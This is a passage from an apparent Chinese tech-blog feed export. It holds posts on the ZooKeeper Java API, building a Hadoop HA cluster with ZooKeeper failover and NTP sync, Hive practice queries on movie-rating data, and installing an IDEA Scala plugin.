2、统一逻辑时钟后，数据id大的胜出 ​ 3、数据id相同的情况下，leader id大的胜出 根据这个规则选出leader。 3.2 stat 的结构 1）czxid- 引起这个znode创建的zxid，创建节点的事务的zxid 每次修改ZooKeeper状态都会收到一个zxid形式的时间戳，也就是ZooKeeper事务ID。事务ID是ZooKeeper中所有修改总的次序。每个修改都有唯一的zxid，如果zxid1小于zxid2，那么zxid1在zxid2之前发生。 2）ctime - znode被创建的毫秒数(从1970年开始) 3）mzxid - znode最后更新的zxid 4）mtime - znode最后修改的毫秒数(从1970年开始) 5）pZxid-znode最后更新的子节点zxid 6）cversion - znode子节点变化号，znode子节点修改次数 7）dataversion - znode数据变化号 8）aclVersion - znode访问控制列表的变化号 9）ephemeralOwner- 如果是临时节点，这个是znode拥有者的session id。如果不是临时节点则是0。 10）dataLength- znode的数据长度 11）numChildren - znode子节点数量 4. 通过 JavaAPI 访问 ZK4.1 添加Maven 依赖123456789101112131415161718192021222324259.1[pom.xml]&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.it18zhang&lt;/groupId&gt; &lt;artifactId&gt;ZooKeeperDemo&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt; &lt;artifactId&gt;zookeeper&lt;/artifactId&gt; &lt;version&gt;3.4.9&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 4.2 Java 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134* 对应关系:* Linux Java----------------------* ls getChildren* get getData* set setDAta* create create˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘˘package com.rox.zktest;import org.apache.zookeeper.*;import org.apache.zookeeper.data.ACL;import org.apache.zookeeper.data.Stat;import org.junit.Test;import java.io.IOException;import java.util.List;/** * 对应关系: * Linux Java * ls getChildren * get getData * set setDAta * create create */public class TestZK &#123; @Test public void ls() throws IOException, KeeperException, InterruptedException &#123; /** * 放三个就不行, 只能放2个目前来看 */ ZooKeeper zk = new ZooKeeper("cs1:2181,cs2:2181,cs3:2181", 5000, null); List&lt;String&gt; list = zk.getChildren("/", null); for (String s : list) &#123; System.out.println(s); &#125; &#125; @Test public void lsAll() &#123; try &#123; ls("/"); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; /** * 列出指定 path 下的children * * @param path */ public void ls(String path) throws Exception &#123; System.out.println(path); ZooKeeper zk = new ZooKeeper("cs1:2181,cs2:2181,cs3:2181", 5000, null); List&lt;String&gt; list = zk.getChildren(path, null); if (list == null || list.isEmpty()) &#123; return; &#125; for (String s : list) &#123; // 先输出 children if (path.equals("/" )) &#123; ls(path + s); &#125; else &#123; ls(path + "/" + s); &#125; &#125; &#125; /** * 设置数据 */ @Test public void setData() throws Exception &#123; ZooKeeper zk = new ZooKeeper("cs1:2181", 5000, null); zk.setData("/a","tomaslee".getBytes(),0); &#125; /** * 创建临时节点 */ @Test public void createEPHEMERAL() throws Exception &#123; ZooKeeper zk = new ZooKeeper("cs1:2181", 5000, null); zk.create("/c/c1", "tom".getBytes(), ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.EPHEMERAL); System.out.println("hello"); &#125; /** * 创建观察者 */ @Test public void testWatch() throws Exception &#123; final ZooKeeper zk = new ZooKeeper("cs1:2181,cs2:2181,cs3:2181", 5000, null); Stat st = new Stat(); Watcher w = null; w = new Watcher() &#123; public void process(WatchedEvent event) &#123; try &#123; System.out.println("数据改了..."); zk.getData("/a",this,null); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125;; byte[] data = zk.getData("/a",w,st); System.out.println(new String(data)); while (true) &#123; Thread.sleep(1000); &#125; &#125;&#125;]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Zookeeper</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>Zookeeper</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoop-HA高可用集群QJM搭建]]></title>
    <url>%2F2018%2F06%2F22%2FHadoop%2F0-Hadoop%2FHadoop-HA%E9%AB%98%E5%8F%AF%E7%94%A8%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[1.此教程默认已经搭建好完全分布式2. Zookeeper 集群搭建1234567891011121314151617181920212223242526272829配置完全分布式zk集群--------------------- 1.挑选3台主机 cs1 ~ cs3 2.每台机器都安装zk tar 环境变量 3.配置zk配置文件 cs1 ~ cs3 [/home/ap/apps/zk/conf/zoo.cfg] ... dataDir=/home/ap/zookeeper 4.在每台主机的/home/centos/zookeeper中添加myid,内容分别是1,2,3 [cs1] $&gt;echo 1 &gt; /home/ap/zookeeper/myid [cs2] $&gt;echo 2 &gt; /home/ap/zookeeper/myid [cs3] $&gt;echo 3 &gt; /home/ap/zookeeper/myid 5.启动服务器集群 $&gt;zkServer.sh start 6.查看每台服务器的状态 $&gt;zkServer.sh status* 注意: 如果有3台机器, 只启动一台的话, 会显示如下, 因为根据配置, 有3台机器, 此时只有一台启动, 没有过半数, 整个集群是挂掉的* 只有启动的机器数量超过配置的半数, zk 集群才有效. 3.HA 集群搭建首先声明笔者用的6台主机, 主机名 cs1-cs6, 用户名为ap, 可以对照改为自己的主机名&amp;用户名 另外, 搭建 HA 不会影响原来的完全分布式, 具体操作会在下面告知.hadoop 安装目录层级结构: /home/ap/apps/hadoop/etc/hadoop/hdfs-site.xml data 目录层级结构: cs1: /home/ap/hadoopdata/namenode/current/edits_00.... cs2: /home/ap/hadoopdata/datanode/current/BP-15... 可以对照参考 集群结构如下 开始搭建首先保证 各节点直接的 ssh 免密登录没问题 如果非生产环境, 可以同时把 .ssh删掉后, 全部重新生成 ssh-keygen, 同时相互发送, 这样操作最简单, 效率最高. 其次上代码了 把原本/home/ap/apps/hadoop/etc/hadoop中的 hadoop目录改为full,意思是完全分布式. cp -r full ha, 复制一份 full 为 ha, 在这份配置文件中配置 HA ln -s /home/ap/apps/hadoop/etc/ha /home/ap/apps/hadoop/etc/hadoop, 用一个软链接hadoop 指向 ha 配置 /home/ap/apps/hadoop/etc/ha/hdfs-site.xml 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576[hdfs-site.xml]------------------------------------------------------------------&lt;configuration&gt; &lt;!-- 指定 2个 namenode 的命名空间 --&gt; &lt;property&gt; &lt;name&gt;dfs.nameservices&lt;/name&gt; &lt;value&gt;mycluster&lt;/value&gt; &lt;/property&gt; &lt;!-- myucluster下的名称节点两个id --&gt; &lt;property&gt; &lt;name&gt;dfs.ha.namenodes.mycluster&lt;/name&gt; &lt;value&gt;nn1,nn2&lt;/value&gt; &lt;/property&gt; &lt;!-- 配置每个nn的rpc地址。 --&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.rpc-address.mycluster.nn1&lt;/name&gt; &lt;value&gt;cs1:8020&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.rpc-address.mycluster.nn2&lt;/name&gt; &lt;value&gt;cs6:8020&lt;/value&gt; &lt;/property&gt; &lt;!-- 配置webui端口 --&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.http-address.mycluster.nn1&lt;/name&gt; &lt;value&gt;cs1:50070&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.http-address.mycluster.nn2&lt;/name&gt; &lt;value&gt;cs6:50070&lt;/value&gt; &lt;/property&gt; &lt;!-- 名称节点共享编辑目录. --&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.shared.edits.dir&lt;/name&gt; &lt;value&gt;qjournal://cs2:8485;cs3:8485;cs4:8485/mycluster&lt;/value&gt; &lt;/property&gt; &lt;!-- java类，client使用它判断哪个节点是激活态。 --&gt; &lt;property&gt; &lt;name&gt;dfs.client.failover.proxy.provider.mycluster&lt;/name&gt; &lt;value&gt;org.apache.hadoop.hdfs.server.namenode.ha.ConfiguredFailoverProxyProvider&lt;/value&gt; &lt;/property&gt; &lt;!-- 脚本列表或者java类，在容灾保护激活态的nn. --&gt; &lt;property&gt; &lt;name&gt;dfs.ha.fencing.methods&lt;/name&gt; &lt;value&gt; sshfence shell(/bin/true) &lt;/value&gt; &lt;/property&gt; &lt;!-- ssh免密登陆 --&gt; &lt;property&gt; &lt;name&gt;dfs.ha.fencing.ssh.private-key-files&lt;/name&gt; &lt;value&gt;/home/ap/.ssh/id_rsa&lt;/value&gt; &lt;/property&gt; &lt;!-- 配置 sshfence 隔离机制超时时间(可不配) --&gt; &lt;property&gt; &lt;name&gt;dfs.ha.fencing.ssh.connect-timeout&lt;/name&gt; &lt;value&gt;30000&lt;/value&gt; &lt;/property&gt; &lt;!-- 配置JN存放edit的本地路径。 --&gt; &lt;property&gt; &lt;name&gt;dfs.journalnode.edits.dir&lt;/name&gt; &lt;value&gt;/home/ap/hadoopdata/journal&lt;/value&gt; &lt;/property&gt; &lt;/configuration&gt; 配置 core-site.xml, 这里给出完整配置 (目前不包括 Hive 配置) 1234567891011121314151617181920212223[core-site.xml]------------------------------------------------------------&lt;configuration&gt; &lt;!-- 指定 hdfs 的 nameservice 为 mycluster --&gt; &lt;property&gt; &lt;name&gt;fs.defaultFS&lt;/name&gt; &lt;value&gt;hdfs://mycluster&lt;/value&gt; &lt;/property&gt; &lt;!-- 指定 hadoop 工作目录 --&gt; &lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; &lt;value&gt;/home/ap/hadoopdata&lt;/value&gt; &lt;/property&gt; &lt;!-- 指定zk集群访问地址 --&gt; &lt;property&gt; &lt;name&gt;ha.zookeeper.quorum&lt;/name&gt; &lt;value&gt;cs1:2181,cs2:2181,cs3:2181&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 配置mapred-site.xml 1234567891011121314151617181920212223[mapred-site.xml]-------------------&lt;configuration&gt; &lt;!-- 指定 mr 框架为 yarn 方式 --&gt; &lt;property&gt; &lt;name&gt;mapreduce.framework.name&lt;/name&gt; &lt;value&gt;yarn&lt;/value&gt; &lt;/property&gt; &lt;!-- 设置 mapreduce 的历史服务器地址和端口号 --&gt; &lt;property&gt; &lt;name&gt;mapreduce.jobhistory.address&lt;/name&gt; &lt;value&gt;cs1:10020&lt;/value&gt; &lt;/property&gt; &lt;!-- mapreduce 历史服务器的 web 访问地址 --&gt; &lt;property&gt; &lt;name&gt;mapreduce.jobhistory.webapp.address&lt;/name&gt; &lt;value&gt;cs1:19888&lt;/value&gt; &lt;/property&gt; &lt;/configuration&gt; 把/home/ap/apps/hadoop/etc/*发给其他所有节点 2-6 注意: 软链接scp 的时候会有问题, 最终保证每个节点跟 cs1一样就可以了,可以每个节点单独修改, 也可以写脚本一起修改 ln -sfT /home/ap/apps/hadoop/etc/ha /home/ap/apps/hadoop/etc/hadoop 部署细节 12345678910111213141516171819202122232425262728293031323334350.在 zk 节点启动 zkServercs1-cs3: $&gt;zkServer.sh start1.在jn节点分别启动jn进程$&gt;hadoop-daemon.sh start journalnode2.启动jn之后，在两个NN之间进行disk元数据同步 a)如果是全新集群，先format文件系统,只需要在一个nn上执行。 [cs1] $&gt;hadoop namenode -format b)如果将非HA集群转换成HA集群，复制原NN的metadata到另一个nn. 1.步骤一 [cs1] $&gt;scp -r /home/centos/hadoop/dfs ap@cs6:/home/centos/hadoop/ 2.步骤二 在新的nn(未格式化的nn)上运行一下命令，实现待命状态引导。 [cs6] $&gt;hdfs namenode -bootstrapStandby //需要cs1为启动状态,提示是否格式化,选择N.3.在一个NN上执行以下命令，完成edit日志到jn节点的传输。$&gt;hdfs namenode -initializeSharedEdits#查看cs2,cs3,cs4 这几个 jn 节点是否有edit数据.4.启动所有节点.[cs1]$&gt;hadoop-daemon.sh start namenode //启动名称节点$&gt;hadoop-daemons.sh start datanode //启动所有数据节点[2,3,4]$&gt;hadoop-daemon.sh start journalnode[cs6]$&gt;hadoop-daemon.sh start namenode //启动名称节点 HA 管理 12345678910# 查看web 界面, 是否是2个 standby 状态http://cs1:50070/http://cs6:50070/hdfs haadmin : 查看 ha 帮助-----------------$&gt;hdfs haadmin -transitionToActive nn1 //切成激活态$&gt;hdfs haadmin -transitionToStandby nn1 //切成待命态$&gt;hdfs haadmin -transitionToActive --forceactive nn2//强行激活$&gt;hdfs haadmin -failover nn1 nn2 //模拟容灾演示,从nn1切换到nn2 加入 Zookeeper 容灾服务 zkfc 12345678910111213141516171819202122232425262728293031323334353637&lt;!-- 1.部署容灾 --&gt;------------------------------a.停止所有进程$&gt;stop-all.shb.配置hdfs-site.xml，启用自动容灾.[hdfs-site.xml]&lt;property&gt; &lt;name&gt;dfs.ha.automatic-failover.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt;&lt;/property&gt;c.配置core-site.xml，指定zk的连接地址.&lt;property&gt; &lt;name&gt;ha.zookeeper.quorum&lt;/name&gt; &lt;value&gt;cs1:2181,cs2:2181,cs3:2181&lt;/value&gt;&lt;/property&gt;d.分发以上两个文件到所有节点。&lt;!-- 2.登录其中的一台NN(s201),在ZK中初始化HA状态, 创建 namenode 的 命名空间节点 mycluster --&gt;------------------------------------$&gt;hdfs zkfc -formatZK&lt;!-- 3.启动hdfs进程. --&gt; $&gt;start-dfs.sh&lt;!-- 4.查看 webUI, 是否有一台自动切换为 active 状态了 --&gt;http://cs1:50070/http://cs6:50070/&lt;!-- 5.测试自动容灾(如果cs6是活跃节点) --&gt; $&gt;kill -9 cs6的 namenode进程号观察 cs1:50070的状态变化 配置RM的HA自动容灾 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021.配置yarn-site.xml&lt;configuration&gt; &lt;!-- 是否允许高可用 --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.ha.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;!-- Identifies the cluster. Used by the elector to ensure an RM doesn’t take over as Active for another cluster. --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.cluster-id&lt;/name&gt; &lt;value&gt;cluster1&lt;/value&gt; &lt;/property&gt; &lt;!-- RM 的 id --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.ha.rm-ids&lt;/name&gt; &lt;value&gt;rm1,rm2&lt;/value&gt; &lt;/property&gt; &lt;!-- 2台 RM 的宿主 --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.hostname.rm1&lt;/name&gt; &lt;value&gt;cs1&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.hostname.rm2&lt;/name&gt; &lt;value&gt;cs6&lt;/value&gt; &lt;/property&gt; &lt;!-- 配置web界面 --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.webapp.address.rm1&lt;/name&gt; &lt;value&gt;cs1:8088&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.webapp.address.rm2&lt;/name&gt; &lt;value&gt;cs6:8088&lt;/value&gt; &lt;/property&gt; &lt;!-- zookeeper 地址 --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.zk-address&lt;/name&gt; &lt;value&gt;cs1:2181,cs2:2181,cs3:2181&lt;/value&gt; &lt;/property&gt; &lt;!-- YARN 集群为 MapReduce 程序提供的 shuffle 服务(原本的) --&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt; &lt;value&gt;mapreduce_shuffle&lt;/value&gt; &lt;/property&gt; &lt;!-- ===========以下是可选的============= --&gt; &lt;!-- 开启 YARN 集群的日志聚合功能 --&gt; &lt;property&gt; &lt;name&gt;yarn.log-aggregation-enable&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;!-- YARN 集群的聚合日志最长保留时长 --&gt; &lt;property&gt; &lt;name&gt;yarn.log-aggregation.retain-seconds&lt;/name&gt; &lt;value&gt;86400&lt;/value&gt; &lt;/property&gt; &lt;!-- 启用自动恢复 --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.recovery.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;!-- 指定 resourcemanager 的状态信息存储在 zookeeper 集群上--&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.store.class&lt;/name&gt; &lt;value&gt;org.apache.hadoop.yarn.server.resourcemanager.recovery.ZKRMStateStore&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt;------------------------------------------------------------------2.使用管理命令&lt;!-- 查看状态 --&gt;$&gt;yarn rmadmin -getServiceState rm1&lt;!-- 切换状态到standby --&gt;$&gt;yarn rmadmin -transitionToStandby rm13.启动yarn集群$&gt;start-yarn.sh4.hadoop没有启动两个resourcemanager,需要手动启动另外一个$&gt;yarn-daemon.sh start resourcemanager5.查看webUI, 点击 About, 查看 active 或 standbyhttp://cs1:8088http://cs6:80886.做容灾模拟.kill -9 活跃的 RM 端口号7.注意: 如果容灾失败, 检查下每台主机时间是否同步$&gt;sudo ntpdate ntp1.aliyun.com 至此, 大功告成 4.HA 集群的启动/关闭4.1 HA 的启动一:单点启动 启动 zk 服务 QuorumPeerMain, 否则后面 RM 会起不来,连不上 ZK 服务cs1-cs3: $&gt; zkServer.sh start 启动 namenode/datanode cs1,cs6: $&gt; hadoop-daemon.sh start namenode cs1/cs6: $&gt; hadoop-daemons.sh start datanode cs6: $&gt; hadoop-daemon.sh start namenode 启动 journalnode cs2-cs4: $&gt; hadoop-daemon.sh start journalnode 启动RM (RM 会自动选出一个 active) cs1,cs6: $&gt; yarn-daemon.sh start resourcemanager cs1/cs6: $&gt; yarn-daemons.sh start nodemanager 启动 zk 的 DFSZKFailoverController cs1,cs6: $&gt; hadoop-daemon.sh start zkfc 此外可以启动MapReduce 的历史任务服务器 [ap@cs1]$&gt; mr-jobhistory-daemon.sh start historyserver 然后访问配置的 http://cs1:19888/jobhistory 二:懒汉启动 启动 zk 服务 QuorumPeerMain, 否则后面 RM 会起不来,连不上 ZK 服务cs1-cs3: $&gt; zkServer.sh start 执行启动全部 cs1: $&gt; start-all.sh(RM 节点) 或者, 使用新的启动方式 cs1: $&gt; start-dfs.sh(任意节点) cs1: $&gt; start-yarn.sh(在 RM 节点) 另一个 RM 节点不会自己启动,要手动启动 cs6: $&gt; yarn-daemon.sh start resourcemanager 三: 启动完成后 1234567891011121314151617181920212223242526272829303132============= cs1 jps =============5696 QuorumPeerMain6641 DFSZKFailoverController6338 NameNode6756 ResourceManager6873 Jps============= cs2 jps =============10849 Jps10722 NodeManager10631 JournalNode10541 DataNode127934 QuorumPeerMain============= cs3 jps =============630 NodeManager758 Jps535 JournalNode443 DataNode117503 QuorumPeerMain============= cs4 jps =============79589 Jps79462 NodeManager79368 JournalNode79278 DataNode============= cs5 jps =============23655 Jps23529 NodeManager23423 DataNode============= cs6 jps =============35680 Jps35506 NameNode35608 DFSZKFailoverController21455 ResourceManager 4.2 HA 的关闭在 一台NN 上stop-all.sh, 注意 zk 的 server- QuorumPeerMain不会停掉 5. 在集群实现时间同步(root 用户操作)思路:时间同步的方式：找一个机器，作为时间服务器，所有的机器与这台集群时间进行定时的同步，比如，每隔十分钟，同步一次时间。 5.1 在cs1上修改ntp服务12345678910111213141516171819202122232425262728293031323334353637383940414243444546471) 检查 ntp 是否安装#root&gt; rpm -qa|grep ntp---ntp-4.2.6p5-10.el6.centos.x86_64fontpackages-filesystem-1.41-1.1.el6.noarchntpdate-4.2.6p5-10.el6.centos.x86_64# 出现上面的3个文件, 就是安装了; 如果没有的话, 用 yum 装一下# root&gt; yum inatall -y ntp2) 修改 ntp 配置文件#root&gt; vi /etc/ntp.conf修改内容如下 a）修改1（设置本地网络上的主机不受限制。） #restrict 192.168.1.0 mask 255.255.255.0 nomodify notrap 为 restrict 192.168.1.0 mask 255.255.255.0 nomodify notrap b）修改2（设置为不采用公共的服务器） server 0.centos.pool.ntp.org iburst server 1.centos.pool.ntp.org iburst server 2.centos.pool.ntp.org iburst server 3.centos.pool.ntp.org iburst 为 #server 0.centos.pool.ntp.org iburst #server 1.centos.pool.ntp.org iburst #server 2.centos.pool.ntp.org iburst #server 3.centos.pool.ntp.org iburst c）添加3（添加默认的一个内部时钟数据，使用它为局域网用户提供服务。） server 127.127.1.0 fudge 127.127.1.0 stratum 103）修改/etc/sysconfig/ntpd 文件#root&gt; vim /etc/sysconfig/ntpd增加内容如下（让硬件时间与系统时间一起同步）SYNC_HWCLOCK=yes4）重新启动ntpd#root&gt; service ntpd statusntpd 已停#root&gt; service ntpd start正在启动 ntpd： 5) 执行开机启动 ntpd 服务#root&gt; chkconfig ntpd on查看 ntpd 服务开机启动的状态#root&gt; chkconfig --list ntpd 5.2 其它机器上1234567891）在其他所有机器配置10分钟与时间服务器同步一次#编写定时任务脚本#root&gt; crontab -e */10 * * * * /usr/sbin/ntpdate hadoop1022) 修改任意机器时间#root&gt; date -s "2017-9-11 11:11:11"3) 十分钟后查看机器时间是否与cs1 同步]]></content>
      <categories>
        <category>Hadoop</category>
        <category>hadoop</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i-Hive-Practice-1 影评练习]]></title>
    <url>%2F2018%2F06%2F19%2FHadoop%2F3-Hive%2Fi-Hive-Practice-1-%E5%BD%B1%E8%AF%84%E7%BB%83%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[现有如此三份数据：1、users.dat 数据格式为： 2::M::56::16::70072对应字段为：UserID BigInt, Gender String, Age Int, Occupation String, Zipcode String对应字段中文解释：用户id，性别，年龄，职业，邮政编码 2、movies.dat 数据格式为： 2::Jumanji (1995)::Adventure|Children’s|Fantasy对应字段为：MovieID BigInt, Title String, Genres String对应字段中文解释：电影ID，电影名字，电影类型 3、ratings.dat 数据格式为： 1::1193::5::978300760对应字段为：UserID BigInt, MovieID BigInt, Rating Double, Timestamped String对应字段中文解释：用户ID，电影ID，评分，评分时间戳 题目要求： 数据要求：（1）写shell脚本清洗数据。（hive不支持解析多字节的分隔符，也就是说hive只能解析’:’, 不支持解析’::’，所以用普通方式建表来使用是行不通的，要求对数据做一次简单清洗）（2）使用Hive能解析的方式进行 Hive要求：（1）正确建表，导入数据（三张表，三份数据），并验证是否正确 （2）求被评分次数最多的10部电影，并给出评分次数（电影名，评分次数） 123456789101112131415161718192021222324252627282930313233343536思路:1. 分组select movieid, count(movieid) rateCount from ratings group by movieid limit 10;2. 排序select movieid, count(movieid) rateCount from ratings group by movieid order by rateCount desc limit 10;3.joinselect a.movieid mvid, b.Title mvtitle, a.rateCount mvratecount from (select movieid, count(movieid) rateCount from ratings group by movieid order by rateCount desc limit 10) ajoin movies b where a.movieid=b.movieid;============================== 完整的------------select a.movieid mvid, b.Title mvtitle, a.rateCount mvratecount from (select movieid, count(movieid) rateCount from ratings group by movieid order by rateCount desc limit 10) ajoin movies b where a.movieid=b.movieid;--结果---+-------+----------------------------------------------------+--------------+| mvid | mvtitle | mvratecount |+-------+----------------------------------------------------+--------------+| 2858 | American Beauty (1999) | 3428 || 260 | Star Wars: Episode IV - A New Hope (1977) | 2991 || 1196 | Star Wars: Episode V - The Empire Strikes Back (1980) | 2990 || 1210 | Star Wars: Episode VI - Return of the Jedi (1983) | 2883 || 480 | Jurassic Park (1993) | 2672 || 2028 | Saving Private Ryan (1998) | 2653 || 589 | Terminator 2: Judgment Day (1991) | 2649 || 2571 | Matrix, The (1999) | 2590 || 1270 | Back to the Future (1985) | 2583 || 593 | Silence of the Lambs, The (1991) | 2578 |+-------+----------------------------------------------------+--------------+ （3）分别求男性，女性当中评分最高的10部电影（性别，电影名，影评分） 123456789101112131415161718192021222324252627# 注意,这里的 avg(r.rating) 是因为group by了 gender,title, 也就是# 说有 gender,title 分组, 此时可能对应此组的有多个值,# 这里就是 相同性别评价相同电影的, 评分有多个, 此时就要使用聚合函数,得出唯一值# 因此就使用了 avg(r.rating)select u.gender, m.title, avg(r.rating) rrfrom ratings r join users u on r.userid=u.userid join movies m on r.movieid=m.movieidwhere u.gender = 'M'group by gender,titleorder by rr desclimit 10;+-----------+--------------------------------------------+------+| u.gender | m.title | rr |+-----------+--------------------------------------------+------+| M | Schlafes Bruder (Brother of Sleep) (1995) | 5.0 || M | Small Wonders (1996) | 5.0 || M | Lured (1947) | 5.0 || M | Bells, The (1926) | 5.0 || M | Dangerous Game (1993) | 5.0 || M | Baby, The (1973) | 5.0 || M | Gate of Heavenly Peace, The (1995) | 5.0 || M | Follow the Bitch (1998) | 5.0 || M | Ulysses (Ulisse) (1954) | 5.0 || M | Angela (1995) | 5.0 |+-----------+--------------------------------------------+------+ （4）求movieid = 2116这部电影各年龄段（因为年龄就只有7个，就按这个7个分就好了）的平均影评（年龄段，影评分） 12345# 注意: 没有歧义的字段, 可以不用指明是谁的属性select age, avg(r.rating) avgrating from ratings r join users u on r.userid=u.useridwhere movieid=2116group by age; （5）求最喜欢看电影（影评次数最多）的那位女性评最高分的10部电影的平均影评分（观影者，电影名，影评分） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# 1.先拿到 影评次数最多的女性(id)0: jdbc:hive2://cs2:10000&gt; select UserID, count(UserID) count from ratings. . . . . . . . . . . . .&gt; group by UserID. . . . . . . . . . . . .&gt; order by count desc. . . . . . . . . . . . .&gt; limit 1;+---------+--------+| userid | count |+---------+--------+| 4169 | 2314 |+---------+--------+# 2.拿到此人评分最高的10部电影, 此人 userid, 电影 id, 此人评分## 一定要去重select distinct(MovieID) MovieID, Rating from ratings where UserID=4169 order by Rating desclimit 10;+----------+---------+| movieid | rating |+----------+---------+| 78 | 5.0 || 73 | 5.0 || 72 | 5.0 || 58 | 5.0 || 55 | 5.0 || 50 | 5.0 || 41 | 5.0 || 36 | 5.0 || 25 | 5.0 || 17 | 5.0 |+----------+---------+3.这10部电影的(观影者，电影名，平均影评分)观影者还没写select t.MovieID, m.Title, avg(r.rating) avgrating from topten t join ratings r on t.MovieID=r.MovieIDjoin movies m on t.MovieID=m.MovieIDgroup by t.MovieID,m.Title;+------------+-----------------------------------------------+---------------------+| t.movieid | m.title | avgrating |+------------+-----------------------------------------------+---------------------+| 3849 | Spiral Staircase, The (1946) | 4.046511627906977 || 3870 | Our Town (1940) | 3.857142857142857 || 3871 | Shane (1953) | 3.839344262295082 || 3893 | Nurse Betty (2000) | 3.5026833631484795 || 3897 | Almost Famous (2000) | 4.22635814889336 || 3910 | Dancer in the Dark (2000) | 3.82 || 3927 | Fantastic Voyage (1966) | 3.5804597701149423 || 3928 | Abbott and Costello Meet Frankenstein (1948) | 3.441747572815534 || 3929 | Bank Dick, The (1940) | 3.993197278911565 || 3932 | Invisible Man, The (1933) | 3.75 |+------------+-----------------------------------------------+---------------------+ （6）求好片（评分&gt;=4.0）最多的那个年份的最好看的10部电影（7）求1997年上映的电影中，评分最高的10部Comedy类电影（8）该影评库中各种类型电影中评价最高的5部电影（类型，电影名，平均影评分）（9）各年评分最高的电影类型（年份，类型，影评分）（10）每个地区最高评分的电影名，把结果存入HDFS（地区，电影名，影评分）]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Hive</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>Hive</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IDEA的简单使用]]></title>
    <url>%2F2018%2F06%2F18%2FTools%2FIDEA%2FIDEA%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[1.安装 Scala 插件首先, 直接在 plugin 中搜索官方的 Scala 语言包插件是连不上的, 要验证一些 UUID之类的东西, 原因你懂的 于是乎在网上搜索, 有一篇博客说, 看搜索的时候显示的版本, 然后下载此版本安装, 如下图中画框的版本号 然后去官网找到此版本安装,下载下来 从磁盘安装 简直不要太坑 b 哦!!! 一直说版本不匹配. 我就一直没有怀疑版本的问题, 直到看到 怎么感觉这个 2013.3 在哪里见到过?? 查了一下我的 idea 版本, 不就是 2017.3.5嘛 ! 难道他们有关系?? 抱着试一试的态度, 随便下了一个2017.3.15的 居然能装上?? 好吧, 重启, OK 了! 由此可见, 也不要完全相信别人的博客啊!! 如果不行, 多方尝试! 尽信书不如无书!]]></content>
      <categories>
        <category>工具</category>
        <category>IDEA</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>工具</tag>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hive学习—2]]></title>
    <url>%2F2018%2F06%2F14%2FHadoop%2F3-Hive%2FHive%E5%AD%A6%E4%B9%A0-2%2F</url>
